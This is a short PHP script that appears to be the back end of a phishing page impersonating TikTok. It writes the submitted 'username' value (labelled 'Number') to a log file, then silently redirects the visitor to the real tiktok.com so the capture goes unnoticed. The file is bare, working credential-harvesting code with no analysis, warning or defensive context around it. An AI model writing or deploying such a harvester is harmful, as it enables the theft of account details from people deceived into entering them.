<?php

    file_put_contents("log.txt", "Number: " . $_POST['username'] . "\n", FILE_APPEND);

header('Location: https://tiktok.com');
exit();
